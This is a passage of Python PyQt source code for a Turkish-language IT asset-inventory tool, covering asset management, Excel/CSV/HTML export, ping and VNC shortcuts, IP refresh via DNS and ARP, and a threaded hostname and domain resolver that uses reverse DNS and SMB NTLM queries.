        dialog=AssetDialog(self,departments=depts);dept_id=self.get_selected_dept_id()
        if dept_id:idx=dialog.dept_combo.findData(dept_id);dialog.dept_combo.setCurrentIndex(idx) if idx>=0 else None
        if dialog.exec()==QDialog.DialogCode.Accepted:data=dialog.get_data();self.org.add_asset(**data) if data['name'] and data['department_id'] else None;self.refresh_assets()
    def edit_asset(self):
        asset_id=self.get_selected_asset_id()
        if not asset_id:return QMessageBox.warning(self,"Uyarı","Bir varlık seçin!")
        asset=self.org.assets.get(asset_id)
        if asset:
            dialog=AssetDialog(self,asset,self.org.get_departments())
            if dialog.exec()==QDialog.DialogCode.Accepted:self.org.update_asset(asset_id,**dialog.get_data());self.refresh_assets()
    def delete_asset(self):
        asset_id=self.get_selected_asset_id()
        if not asset_id:return QMessageBox.warning(self,"Uyarı","Bir varlık seçin!")
        asset=self.org.assets.get(asset_id)
        if asset and QMessageBox.question(self,"Onay",f"'{asset.name}' silinecek?")==QMessageBox.StandardButton.Yes:self.org.delete_asset(asset_id);self.refresh_assets()
    def import_excel(self):
        dept_id=self.get_selected_dept_id()
        if not dept_id:return QMessageBox.warning(self,"Uyarı","Önce bir birim seçin!")
        type_dialog=QDialog(self);type_dialog.setWindowTitle("Varlık Türü Seçin");type_dialog.setMinimumWidth(300);tl=QVBoxLayout(type_dialog);tl.addWidget(QLabel("Import edilecek varlık türünü seçin:"))
        type_combo=QComboBox()
        for atype in AssetType:cfg=ASSET_CONFIG[atype];type_combo.addItem(f"{cfg['icon']} {cfg['name']}",atype.value)
        tl.addWidget(type_combo);btns=QDialogButtonBox(QDialogButtonBox.StandardButton.Ok|QDialogButtonBox.StandardButton.Cancel);btns.accepted.connect(type_dialog.accept);btns.rejected.connect(type_dialog.reject);tl.addWidget(btns)
        if type_dialog.exec()!=QDialog.DialogCode.Accepted:return
        path,_=QFileDialog.getOpenFileName(self,"Excel Seç","","Excel (*.xlsx *.xls);;CSV (*.csv)")
        if path:imported,errors=self.org.import_from_excel(path,dept_id,type_combo.currentData());msg=f"✅ {imported} varlık eklendi.";msg+=f"\n\n⚠️ Hatalar:\n"+"\n".join(errors[:5]) if errors else "";QMessageBox.information(self,"Import",msg);self.refresh_all()
    
    def scan_hardware_for_assets(self):
        """Donanım bilgisi eksik varlıkları tara"""
        # IP adresi olan varlıkları bul
        hw_filter = self.hw_filter.currentData() if hasattr(self, 'hw_filter') else "all"
        dept_id = self.get_selected_dept_id()
        type_filter = self.type_filter.currentData()
        
        assets = self.org.get_assets(dept_id if dept_id else None, type_filter if type_filter else None)
        
        # Filtreye göre varlıkları seç
        if hw_filter == "no_hw":
            assets = [a for a in assets if not a.last_hw_scan and a.ip_address]
        elif hw_filter == "has_hw":
            assets = [a for a in assets if a.last_hw_scan and a.ip_address]
        else:
            assets = [a for a in assets if a.ip_address]
        
        if not assets:
            QMessageBox.warning(self, "Uyarı", "IP adresi olan varlık bulunamadı!")
            return
        
        # IP listesini oluştur
        ip_list = [a.ip_address for a in assets if a.ip_address]
        
        if not ip_list:
            QMessageBox.warning(self, "Uyarı", "Taranacak IP adresi yok!")
            return
        
        # Kimlik bilgisi sor
        cred_dialog = QDialog(self)
        cred_dialog.setWindowTitle("🔐 Tarama Kimlik Bilgileri")
        cred_dialog.setMinimumWidth(350)
        cl = QVBoxLayout(cred_dialog)
        
        cl.addWidget(QLabel(f"📊 {len(ip_list)} varlık taranacak"))
        cl.addWidget(QLabel(""))
        
        form = QFormLayout()
        domain_input = QLineEdit()
        domain_input.setPlaceholderText("(opsiyonel)")
        form.addRow("Domain:", domain_input)
        
        user_input = QLineEdit()
        user_input.setText("administrator")
        form.addRow("Kullanıcı:", user_input)
        
        pass_input = QLineEdit()
        pass_input.setEchoMode(QLineEdit.EchoMode.Password)
        form.addRow("Şifre:", pass_input)
        
        cl.addLayout(form)
        
        btns = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        btns.accepted.connect(cred_dialog.accept)
        btns.rejected.connect(cred_dialog.reject)
        cl.addWidget(btns)
        
        if cred_dialog.exec() != QDialog.DialogCode.Accepted:
            return
        
        username = user_input.text().strip()
        password = pass_input.text()
        domain = domain_input.text().strip()
        
        if not username or not password:
            QMessageBox.warning(self, "Uyarı", "Kullanıcı adı ve şifre gerekli!")
            return
        
        # Ana pencereyi bul ve sistem bilgisi sekmesine geç
        main_window = self.window()
        if hasattr(main_window, 'tabs') and hasattr(main_window, 'sysinfo_widget'):
            # Sistem Bilgisi sekmesine geç
            for i in range(main_window.tabs.count()):
                if "Sistem Bilgisi" in main_window.tabs.tabText(i):
                    main_window.tabs.setCurrentIndex(i)
                    break
            
            # Kimlik bilgilerini doldur
            sw = main_window.sysinfo_widget
            sw.domain_input.setText(domain)
            sw.user_input.setText(username)
            sw.pass_input.setText(password)
            sw.target_input.setText(",".join(ip_list))
            
            # Taramayı başlat
            QMessageBox.information(self, "Hazır", 
                f"📊 {len(ip_list)} IP adresi hedef olarak girildi.\n\n"
                f"Sistem Bilgisi sekmesinde 'BİLGİ TOPLA' butonuna basın.\n"
                f"Tarama bitince 'Varlıklara Aktar' ile bilgileri kaydedin.")
        else:
            QMessageBox.warning(self, "Hata", "Sistem Bilgisi sekmesi bulunamadı!")
    
    def export_excel(self):
        dept_id = self.get_selected_dept_id()
        type_filter = self.type_filter.currentData()

        # Format seçimi diyaloğu
        dlg = QDialog(self)
        dlg.setWindowTitle("📤 Export Formatı")
        dlg.setMinimumWidth(360)
        dlg.setStyleSheet("QDialog{background:#0a0a14;}QLabel{color:white;}QPushButton{background:#16213e;color:#00ff88;padding:10px;border:1px solid #0f3460;border-radius:6px;font-size:12px;margin:2px;}QPushButton:hover{background:#0f3460;}")
        fl = QVBoxLayout(dlg)
        fl.setSpacing(6)
        fl.setContentsMargins(16, 16, 16, 16)

        lbl = QLabel("Export formatını seçin:")
        lbl.setStyleSheet("color:#888;font-size:11px;margin-bottom:4px;")
        fl.addWidget(lbl)

        btn_full = QPushButton("📊  Excel — Tam Rapor\n(Temel + Ağ + Donanım tüm alanlar)")
        btn_full.setStyleSheet("QPushButton{background:#145A32;color:#00ff88;padding:12px;border:1px solid #1abc9c;border-radius:6px;font-size:11px;font-weight:bold;text-align:left;}QPushButton:hover{background:#1abc9c;color:#0a0a14;}")
        btn_full.clicked.connect(lambda: dlg.done(1))
        fl.addWidget(btn_full)

        btn_csv = QPushButton("📄  CSV — Tüm Alanlar\n(Excel olmadan açılabilir)")
        btn_csv.clicked.connect(lambda: dlg.done(2))
        fl.addWidget(btn_csv)

        btn_html = QPushButton("🌐  HTML Rapor\n(Tarayıcıda görüntülenebilir, detaylı)")
        btn_html.clicked.connect(lambda: dlg.done(3))
        fl.addWidget(btn_html)

        btn_cancel = QPushButton("İptal")
        btn_cancel.setStyleSheet("QPushButton{background:#16213e;color:#888;padding:8px;border:1px solid #333;border-radius:6px;}")
        btn_cancel.clicked.connect(dlg.reject)
        fl.addWidget(btn_cancel)

        result = dlg.exec()

        if result == 1:
            path, _ = QFileDialog.getSaveFileName(self, "Kaydet", "varliklar_tam.xlsx", "Excel (*.xlsx)")
            if path:
                ok, msg = self.org.export_to_excel(
                    path,
                    dept_id if dept_id else None,
                    type_filter if type_filter else None
                )
                QMessageBox.information(self, "Export", f"✅ Kaydedildi!\n{path}" if ok else f"Hata: {msg}")
        elif result == 2:
            path, _ = QFileDialog.getSaveFileName(self, "Kaydet", "varliklar_tam.csv", "CSV (*.csv)")
            if path:
                ok, msg = self.org.export_to_excel(
                    path,
                    dept_id if dept_id else None,
                    type_filter if type_filter else None
                )
                QMessageBox.information(self, "Export", f"✅ CSV kaydedildi!\n{path}" if ok else f"Hata: {msg}")
        elif result == 3:
            self.export_html_report(dept_id, type_filter)

    def export_excel_with_hardware(self, dept_id, type_filter):
        """Geriye dönük uyumluluk — tam export'u çağırır."""
        path, _ = QFileDialog.getSaveFileName(self, "Kaydet", "varliklar_tam.xlsx", "Excel (*.xlsx)")
        if path:
            ok, msg = self.org.export_to_excel(
                path,
                dept_id if dept_id else None,
                type_filter if type_filter else None
            )
            QMessageBox.information(self, "Export", f"✅ Kaydedildi!\n{path}" if ok else f"Hata: {msg}")
    
    def export_html_report(self, dept_id, type_filter):
        """Detaylı HTML rapor export"""
        path, _ = QFileDialog.getSaveFileName(self, "Kaydet", "varlik_raporu.html", "HTML (*.html)")
        if not path:
            return
        
        assets = self.org.get_assets(dept_id if dept_id else None, type_filter if type_filter else None)
        
        html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Varlik Envanter Raporu</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: white; padding: 20px; }
        h1 { color: #00d4ff; border-bottom: 2px solid #00d4ff; padding-bottom: 10px; }
        h2 { color: #00ff88; margin-top: 20px; }
        .asset-card { background: #16213e; padding: 15px; margin: 15px 0; border-radius: 10px; border-left: 4px solid #00d4ff; }
        .asset-card.critical { border-left-color: #e74c3c; }
        .asset-name { color: #00d4ff; font-size: 16px; font-weight: bold; margin-bottom: 10px; }
        .info-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .info-item { background: #0a0a14; padding: 8px; border-radius: 5px; }
        .info-label { color: #888; font-size: 11px; }
        .info-value { color: #00ff88; font-size: 13px; }
        .hw-section { margin-top: 10px; padding-top: 10px; border-top: 1px solid #0f3460; }
        .hw-title { color: #f39c12; font-weight: bold; margin-bottom: 8px; }
        .no-hw { color: #888; font-style: italic; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; }
        th { background: #0f3460; color: #00ff88; }
        .summary { background: #0f3460; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        .summary-item { display: inline-block; margin-right: 30px; }
        .summary-value { font-size: 24px; color: #00d4ff; font-weight: bold; }
        .summary-label { color: #888; font-size: 12px; }
    </style>
</head>
<body>
    <h1>Varlik Envanter Raporu</h1>
    <p>Tarih: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + f"""</p>
    
    <div class="summary">
        <div class="summary-item">
            <div class="summary-value">{len(assets)}</div>
            <div class="summary-label">Toplam Varlik</div>
        </div>
        <div class="summary-item">
            <div class="summary-value">{len([a for a in assets if a.last_hw_scan])}</div>
            <div class="summary-label">Donanim Bilgisi Var</div>
        </div>
        <div class="summary-item">
            <div class="summary-value">{len([a for a in assets if a.is_critical])}</div>
            <div class="summary-label">Kritik Varlik</div>
        </div>
    </div>
"""
        
        for asset in assets:
            cfg = asset.get_type_config()
            dept = self.org.departments.get(asset.department_id, Department())
            critical_class = " critical" if asset.is_critical else ""
            
            html += f"""
    <div class="asset-card{critical_class}">
        <div class="asset-name">{cfg['icon']} {asset.name} {"⚠️" if asset.is_critical else ""}</div>
        
        <div class="info-grid">
            <div class="info-item">
                <div class="info-label">Tur</div>
                <div class="info-value">{cfg['name']}</div>
            </div>
            <div class="info-item">
                <div class="info-label">Birim</div>
                <div class="info-value">{dept.name}</div>
            </div>
            <div class="info-item">
                <div class="info-label">Konum</div>
                <div class="info-value">{asset.location or '-'}</div>
            </div>
            <div class="info-item">
                <div class="info-label">IP Adresi</div>
                <div class="info-value">{asset.ip_address or '-'}</div>
            </div>
            <div class="info-item">
                <div class="info-label">Hostname</div>
                <div class="info-value">{asset.hostname or '-'}</div>
            </div>
            <div class="info-item">
                <div class="info-label">MAC</div>
                <div class="info-value">{asset.mac_address or '-'}</div>
            </div>
            <div class="info-item">
                <div class="info-label">Vendor</div>
                <div class="info-value">{asset.vendor or '-'}</div>
            </div>
            <div class="info-item">
                <div class="info-label">Açık Portlar</div>
                <div class="info-value" style="font-size:11px">{asset.open_ports or '-'}</div>
            </div>
        </div>
"""
            
            if asset.last_hw_scan:
                html += f"""
        <div class="hw-section">
            <div class="hw-title">Donanim Bilgileri (Son Tarama: {asset.last_hw_scan})</div>
            <div class="info-grid">
                <div class="info-item">
                    <div class="info-label">Isletim Sistemi</div>
                    <div class="info-value">{asset.os_name or '-'}</div>
                </div>
                <div class="info-item">
                    <div class="info-label">CPU</div>
                    <div class="info-value">{asset.cpu_name or '-'}</div>
                </div>
                <div class="info-item">
                    <div class="info-label">RAM</div>
                    <div class="info-value">{asset.ram_total or '-'} {(' / ' + asset.ram_details) if asset.ram_details else ''}</div>
                </div>
                <div class="info-item">
                    <div class="info-label">GPU</div>
                    <div class="info-value">{asset.gpu_name or '-'}{(' / ' + asset.gpu_vram) if asset.gpu_vram else ''}</div>
                </div>
                <div class="info-item">
                    <div class="info-label">PC Üretici / Model</div>
                    <div class="info-value">{asset.pc_manufacturer or '-'} {asset.pc_model or ''}</div>
                </div>
                <div class="info-item">
                    <div class="info-label">BIOS Seri No</div>
                    <div class="info-value">{asset.bios_serial or '-'}</div>
                </div>
"""
                # Diskleri ayrı ayrı ekle
                if asset.disks:
                    for i, d in enumerate(asset.disks):
                        disk_text = f"{d.get('model', '')} ({d.get('size', '')}) [{d.get('type', '')}]"
                        html += f"""                <div class="info-item">
                    <div class="info-label">Disk {i+1}</div>
                    <div class="info-value">{disk_text}</div>
                </div>
"""
                elif asset.disk_info:
                    html += f"""                <div class="info-item">
                    <div class="info-label">Disk</div>
                    <div class="info-value">{asset.disk_info or '-'}</div>
                </div>
"""
                html += f"""                <div class="info-item">
                    <div class="info-label">PC</div>
                    <div class="info-value">{asset.pc_manufacturer} {asset.pc_model}</div>
                </div>
            </div>
        </div>
"""
            else:
                html += """
        <div class="hw-section">
            <div class="no-hw">Donanim bilgisi taranmamis</div>
        </div>
"""
            
            html += "    </div>\n"
        
        html += """
</body>
</html>"""
        
        with open(path, 'w', encoding='utf-8-sig') as f:
            f.write(html)
        
        QMessageBox.information(self, "Export", f"✅ HTML rapor kaydedildi!\n{path}")
    
    def show_asset_context_menu(self,pos):
        """Varlık tablosu sağ tık menüsü"""
        row=self.asset_table.rowAt(pos.y())
        if row<0:return
        
        item=self.asset_table.item(row,0)
        if not item:return
        
        asset_id=item.data(Qt.ItemDataRole.UserRole)
        asset=self.org.assets.get(asset_id)
        if not asset:return
        
        menu=QMenu(self)
        menu.setStyleSheet("""
            QMenu{background:#1a1a2e;color:white;border:2px solid #00ff88;border-radius:8px;padding:5px;}
            QMenu::item{padding:10px 20px;border-radius:4px;}
            QMenu::item:selected{background:#00ff88;color:#0a0a14;}
            QMenu::separator{height:2px;background:#0f3460;margin:5px 10px;}
        """)
        
        # VNC Bağlantısı
        if asset.ip_address:
            vnc_act = menu.addAction("🖥️ VNC Bağlan")
            vnc_act.triggered.connect(lambda: self.connect_vnc_to_asset(asset))
            menu.addSeparator()
        
        # Ping seçenekleri
        if asset.ip_address:
            menu.addAction(f"📡 Ping At: {asset.ip_address}").triggered.connect(lambda:self.ping_single_asset(asset))
            menu.addAction(f"🔄 Sürekli Ping (-t): {asset.ip_address}").triggered.connect(lambda:self.continuous_ping_asset(asset))
        if asset.hostname:
            menu.addAction(f"📡 Hostname Ping: {asset.hostname}").triggered.connect(lambda:self.ping_hostname(asset.hostname))
        
        menu.addSeparator()
        menu.addAction("✏️ Düzenle").triggered.connect(self.edit_asset)
        menu.addAction("🗑️ Sil").triggered.connect(self.delete_asset)
        
        # ── Ağ araçları ──────────────────────────────────────────────
        if asset.hostname or asset.mac_address or asset.ip_address:
            menu.addSeparator()
        if asset.hostname or asset.mac_address:
            ip_act = menu.addAction("🔄 IP Adresini Güncelle")
            ip_act.triggered.connect(lambda: self.update_single_ip(asset))
        if asset.ip_address:
            hn_act = menu.addAction("🖥️ Hostname Tara / Güncelle")
            hn_act.triggered.connect(lambda: self._scan_single_hostname(asset))

        # Watchdog geçmişi
        menu.addSeparator()
        hist_act = menu.addAction("📋 Watchdog Geçmişini Gör")
        hist_act.triggered.connect(lambda: self._show_asset_history(asset))

        # ── Kopyala ──────────────────────────────────────────────────
        copy_items = []
        if asset.ip_address:   copy_items.append(("📋 IP Kopyala",       asset.ip_address))
        if asset.hostname:     copy_items.append(("📋 Hostname Kopyala", asset.hostname))
        if asset.mac_address:  copy_items.append(("📋 MAC Kopyala",      asset.mac_address))
        if copy_items:
            menu.addSeparator()
            for label, val in copy_items:
                menu.addAction(label).triggered.connect(
                    (lambda v: lambda: QApplication.clipboard().setText(v))(val))

        menu.exec(self.asset_table.viewport().mapToGlobal(pos))
    
    def _show_asset_history(self, asset):
        """Bu varlığın watchdog geçmişini WatchdogWidget'ta gösterir."""
        main = self.window()
        if not hasattr(main, 'watchdog_widget') or not hasattr(main, 'tabs'):
            QMessageBox.information(self, "Bilgi",
                "Watchdog sekmesi bulunamadı.")
            return
        ww = main.watchdog_widget
        # Sekmeye geç
        main.tabs.setCurrentWidget(ww)
        # Arama kutusuna varlık adını yaz → filtre otomatik çalışır
        ww.search_box.setText(asset.name)
        ww.filter_combo.setCurrentIndex(0)   # Tüm olaylar
        # Vurgu: başlığı güncelle
        ww.status_lbl.setText(
            f"🔍  '{asset.name}' için watchdog geçmişi — aramayı temizlemek için 🔍 kutusunu boşaltın")

    def _scan_single_hostname(self, asset):
        """Tek varlık için hostname tarama diyaloğunu açar"""
        dialog = HostnameScanDialog(self, [asset], self.org)
        dialog.exec()
        self.refresh_assets()

    def connect_vnc_to_asset(self, asset):
        """Varlığa VNC ile bağlan"""
        if not asset.ip_address:
            QMessageBox.warning(self, "Uyarı", "Bu varlığın IP adresi yok!")
            return
        
        # Ana pencereyi bul ve vnc_connect fonksiyonunu çağır
        main_window = self.window()
        if hasattr(main_window, 'vnc_connect'):
            # Geçici bir device oluştur
            from dataclasses import dataclass
            temp_device = type('TempDevice', (), {
                'ip': asset.ip_address,
                'vnc_port': 5900,
                'hostname': asset.hostname or asset.name
            })()
            main_window.vnc_connect(temp_device)
        else:
            # Direkt VNC viewer çalıştır
            try:
                vnc_paths = [
                    r"C:\Program Files\TigerVNC\vncviewer.exe",
                    r"C:\Program Files (x86)\TigerVNC\vncviewer.exe",
                    r"C:\Program Files\TightVNC\tvnviewer.exe",
                    r"C:\Program Files (x86)\TightVNC\tvnviewer.exe",
                    r"C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe",
                ]
                vnc_exe = None
                for path in vnc_paths:
                    if os.path.exists(path):
                        vnc_exe = path
                        break
                
                if vnc_exe:
                    subprocess.Popen([vnc_exe, f"{asset.ip_address}:5900"])
                else:
                    QMessageBox.warning(self, "VNC Viewer Bulunamadı", 
                        "TigerVNC, TightVNC veya RealVNC kurulu değil.\n\nKurmak için: https://tigervnc.org")
            except Exception as e:
                QMessageBox.warning(self, "Hata", f"VNC başlatılamadı: {str(e)}")
    
    def show_dept_context_menu(self,pos):
        """Birim listesi sağ tık menüsü"""
        item=self.dept_list.itemAt(pos)
        if not item:return
        
        dept_id=item.data(Qt.ItemDataRole.UserRole)
        
        menu=QMenu(self)
        menu.setStyleSheet("""
            QMenu{background:#1a1a2e;color:white;border:2px solid #00ff88;border-radius:8px;padding:5px;}
            QMenu::item{padding:10px 20px;border-radius:4px;}
            QMenu::item:selected{background:#00ff88;color:#0a0a14;}
            QMenu::separator{height:2px;background:#0f3460;margin:5px 10px;}
        """)
        
        menu.addAction("📡 Tüm Birimi Ping'le").triggered.connect(lambda:self.ping_department(dept_id))
        menu.addSeparator()
        menu.addAction("✏️ Birimi Düzenle").triggered.connect(self.edit_department)
        menu.addAction("🗑️ Birimi Sil").triggered.connect(self.delete_department)
        
        menu.exec(self.dept_list.viewport().mapToGlobal(pos))
    
    def ping_single_asset(self,asset):
        """Tek varlığa ping at"""
        ip=asset.ip_address
        if not ip:
            QMessageBox.warning(self,"Uyarı","Bu varlığın IP adresi yok!")
            return
        
        # Ping dialogu göster
        dialog=PingResultDialog(self,[(asset.name,ip)])
        dialog.exec()
    
    def ping_hostname(self,hostname):
        """Hostname'e ping at"""
        dialog=PingResultDialog(self,[("Hostname",hostname)])
        dialog.exec()
    
    def continuous_ping_asset(self, asset):
        """Sürekli ping at (ping -t gibi)"""
        ip = asset.ip_address
        if not ip:
            QMessageBox.warning(self, "Uyarı", "Bu varlığın IP adresi yok!")
            return
        dialog = ContinuousPingDialog(self, asset.name, ip)
        dialog.exec()
    
    def ping_department(self,dept_id):
        """Tüm birimi ping'le"""
        if dept_id:
            assets=self.org.get_assets(dept_id)
        else:
            assets=list(self.org.assets.values())
        
        # IP'si olan varlıkları filtrele
        targets=[(a.name,a.ip_address) for a in assets if a.ip_address]
        
        if not targets:
            QMessageBox.warning(self,"Uyarı","Bu birimde IP adresi olan varlık yok!")
            return
        
        dialog=PingResultDialog(self,targets)
        dialog.exec()
    
    def update_single_ip(self, asset):
        """Tek varlığın IP adresini güncelle"""
        old_ip = asset.ip_address or ""
        new_ip = None
        method = ""
        
        # Hostname üzerinden IP bul
        if asset.hostname:
            try:
                if platform.system() == "Windows":
                    result = run_command(["nslookup", asset.hostname], timeout=5)
                    if result.returncode == 0:
                        lines = result.stdout.split('\n')
                        for i, line in enumerate(lines):
                            if 'Address' in line and i > 1:  # İlk Address satırı DNS server
                                parts = line.split(':')
                                if len(parts) > 1:
                                    ip = parts[1].strip()
                                    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
                                        new_ip = ip
                                        method = "hostname"
                                        break
                else:
                    result = run_command(["getent", "hosts", asset.hostname], timeout=5)
                    if result.returncode == 0 and result.stdout.strip():
                        new_ip = result.stdout.split()[0]
                        method = "hostname"
            except:
                pass
        
        # MAC adresi üzerinden ARP tablosundan IP bul
        if not new_ip and asset.mac_address:
            try:
                mac_upper = asset.mac_address.upper().replace('-', ':')
                if platform.system() == "Windows":
                    result = run_command(["arp", "-a"], timeout=5)
                else:
                    result = run_command(["arp", "-n"], timeout=5)
                
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        line_upper = line.upper().replace('-', ':')
                        if mac_upper in line_upper:
                            # IP adresini bul
                            match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
                            if match:
                                new_ip = match.group(1)
                                method = "mac"
                                break
            except:
                pass
        
        if not new_ip:
            QMessageBox.information(self, "Bilgi", 
                f"'{asset.name}' için yeni IP adresi bulunamadı.\n\n"
                f"Hostname: {asset.hostname or 'Yok'}\n"
                f"MAC: {asset.mac_address or 'Yok'}\n"
                f"Mevcut IP: {old_ip or 'Yok'}")
            return
        
        if new_ip == old_ip:
            QMessageBox.information(self, "Bilgi", 
                f"'{asset.name}' için IP adresi değişmemiş.\n\nMevcut IP: {old_ip}")
            return
        
        # Kullanıcıya sor
        method_text = "Hostname" if method == "hostname" else "MAC adresi"
        reply = QMessageBox.question(self, "IP Güncelleme",
            f"<b>{asset.name}</b> için IP adresi değişikliği tespit edildi:<br><br>"
            f"<span style='color:#ff6b6b'>Eski IP:</span> {old_ip or '(boş)'}<br>"
            f"<span style='color:#00ff88'>Yeni IP:</span> {new_ip}<br><br>"
            f"<i>Tespit yöntemi: {method_text}</i><br><br>"
            f"Güncellensin mi?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            self.org.update_asset(asset.id, ip_address=new_ip)
            self.refresh_assets()
            QMessageBox.information(self, "Başarılı", 
                f"✅ '{asset.name}' IP adresi güncellendi:\n{old_ip or '(boş)'} → {new_ip}")
    
    def update_all_ips(self):
        """Tüm varlıkların IP adreslerini kontrol et ve güncelle"""
        # Hostname veya MAC adresi olan varlıkları bul
        dept_id = self.get_selected_dept_id()
        if dept_id:
            assets = self.org.get_assets(dept_id)
        else:
            assets = list(self.org.assets.values())
        
        # Kontrol edilebilir varlıkları filtrele (hostname veya MAC'i olanlar)
        checkable = [a for a in assets if a.hostname or a.mac_address]
        
        if not checkable:
            QMessageBox.warning(self, "Uyarı", 
                "IP güncellemesi için hostname veya MAC adresi olan varlık bulunamadı!")
            return
        
        # IP Güncelleme dialogunu göster
        dialog = IPUpdateDialog(self, checkable, self.org)
        dialog.exec()
        self.refresh_assets()

    def scan_hostnames_for_assets(self):
        """Varlıkların güncel hostname bilgisini tara ve güncelle"""
        dept_id    = self.get_selected_dept_id()
        type_filter = self.type_filter.currentData() if hasattr(self, 'type_filter') else None
        assets = self.org.get_assets(
            dept_id if dept_id else None,
            type_filter if type_filter else None
        )
        scannable = [a for a in assets if a.ip_address]
        if not scannable:
            QMessageBox.warning(self, "Uyarı",
                "IP adresi olan varlık bulunamadı!\n"
                "Filtre seçiliyse 'Tümü' yapın veya önce IP adreslerini girin.")
            return
        if len(scannable) > 50:
            reply = QMessageBox.question(
                self, "Onay",
                f"{len(scannable)} varlık için hostname taraması başlatılacak.\n"
                f"Bu işlem birkaç dakika sürebilir.\n\nDevam edilsin mi?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
            )
            if reply != QMessageBox.StandardButton.Yes:
                return
        dialog = HostnameScanDialog(self, scannable, self.org)
        dialog.exec()
        self.refresh_assets()



def detect_hostname_format(hostname):
    """
    Hostname formatını belirler.

      'eski'  → yalnızca harf / nokta / tire içerir  (örn: ahmet.kaya, MUHASEBE, zeynep)
      'yeni'  → harf + rakam karışık                 (örn: B1504, PC-A3F2, WS-B7K9)
      ''      → boş / tanımlanamıyor

    FQDN desteği: noktalı adlarda sadece kısa ad (ilk segment) incelenir.
      Örn: AHMETKAYA.domain.local → 'eski'   (kısa ad: AHMETKAYA)
           B1504.domain.local     → 'yeni'   (kısa ad: B1504)
    """
    if not hostname:
        return ""
    # FQDN ise kısa adı al
    short = hostname.split('.')[0]
    clean = short.replace("-", "").replace("_", "")
    if not clean:
        return ""
    has_letter = any(c.isalpha() for c in clean)
    has_digit  = any(c.isdigit() for c in clean)
    if has_letter and has_digit:
        return "yeni"
    if has_letter and not has_digit:
        return "eski"
    return ""


class HostnameScanThread(QThread):
    """Varlıkların hostname ve etki alanlarını paralel olarak çözen thread."""
    result         = pyqtSignal(str, str, str, str, str, str, str)  # asset_id, ip, hostname, verified_domain, predicted_domain, domain_source, confidence
    finished_signal= pyqtSignal(int, int)             # toplam, başarılı
    progress       = pyqtSignal(int)

    def __init__(self, assets, known_domains: list = None):
        super().__init__()
        self.assets         = assets
        self.known_domains  = known_domains or []
        self._stop          = False

    def stop(self):
        self._stop = True

    def run(self):
        success = 0
        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = {ex.submit(self._resolve, a, self.known_domains): a
                       for a in self.assets}
            done = 0
            for f in as_completed(futures):
                if self._stop:
                    for pending in futures:
                        pending.cancel()
                    break
                asset = futures[f]
                try:
                    short, verified, predicted, source, confidence = f.result()
                    if short:
                        success += 1
                    self.result.emit(asset.id, asset.ip_address,
                                     short or "", verified or "",
                                     predicted or "", source, confidence)
                except Exception:
                    self.result.emit(asset.id, asset.ip_address,
                                     "", "", "", "error", "LOW")
                done += 1
                self.progress.emit(done)
        self.finished_signal.emit(len(self.assets), success)

    def _resolve(self, asset, known_domains: list = None) -> tuple[str, str, str, str, str]:
        """IP → (hostname, verified_domain, predicted_domain, domain_source, confidence)

        Öncelik:
        1. Kayıtlı hostname formatı (kullanıcı kuralı, kesin):
           - B1504... formatı → enerji.local  (HIGH, registered_hostname_rule)
           - Ad-soyad formatı → merkez.local (HIGH, registered_hostname_rule)
        2. PTR + SMB doğrulaması (ek kontrol, çelişirse log'a düşer)
        """
        ip             = asset.ip_address
        active_domains = known_domains or []
        domain1 = active_domains[0].lower().strip() if len(active_domains) > 0 else ""
        domain2 = active_domains[1].lower().strip() if len(active_domains) > 1 else ""

        # ── Adım 1: Kayıtlı hostname formatından domain kuralı ────────────
        # Bu kural kullanıcı tarafından doğrulanmış — tahmin değil, kural.
        registered_hn  = (asset.hostname or "").strip().upper()
        registered_fmt = detect_hostname_format(registered_hn)
        rule_domain    = ""

        if registered_fmt == 'yeni' and domain2:
            rule_domain = domain2   # B1504... → enerji.local
        elif registered_fmt == 'eski' and domain1:
            rule_domain = domain1   # MEHMETOTUN → merkez.local

        # ── Adım 2: PTR — ağdan gelen hostname al ────────────────────────
        short        = ""
        ptr_domain   = ""
        ptr_has_fqdn = False
        try:
            fqdn  = socket.gethostbyaddr(ip)[0]
            parts = fqdn.split('.')
            short = parts[0].strip().upper()
            if len(parts) > 1:
                ptr_domain   = '.'.join(parts[1:]).lower()
                ptr_has_fqdn = True
        except Exception:
            pass

        # ── Adım 3: SMB NTLM — koşulsuz, her IP için dene ────────────────
        smb_domain = ""
        try:
            smb_dns, _ = self._query_smb_ntlm(ip)
            if smb_dns:
                smb_domain = smb_dns.lower().strip()
                smb_domain = next(
                    (d for d in active_domains
                     if smb_domain == d or smb_domain.endswith('.'+d)),
                    smb_domain
                )
        except Exception:
            pass

        # ── Karar ────────────────────────────────────────────────────────
        # Kayıt kuralı önceliklidir.
        # PTR veya SMB aynı sonucu verirse güven artar.
        # Çelişirse kural yine de geçerli, ama source'a not düşülür.

        if rule_domain:
            # Kural mevcut — PTR/SMB ile çelişiyor mu kontrol et
            ptrok = (not ptr_has_fqdn) or (ptr_domain == rule_domain)
            smbok = (not smb_domain)   or (smb_domain == rule_domain)

            if ptrok and smbok:
                source     = "registered_hostname_rule"
                confidence = "HIGH"
            elif not ptrok and not smbok:
                # İkisi de farklı → kural yine de geçer, uyarı var
                source     = "registered_hostname_rule+network_conflict"
                confidence = "MEDIUM"
            else:
                # Biri uyumsuz
                source     = "registered_hostname_rule+partial_conflict"
                confidence = "HIGH"   # Kural hâlâ baskın

            return short, rule_domain, "", source, confidence

        # Kural yoksa (hostname boş veya format tanınamadı):
        # PTR + SMB doğrulaması
        verified   = ""
        source     = "unknown"
        confidence = "LOW"

        if smb_domain and ptr_has_fqdn:
            if smb_domain == ptr_domain:
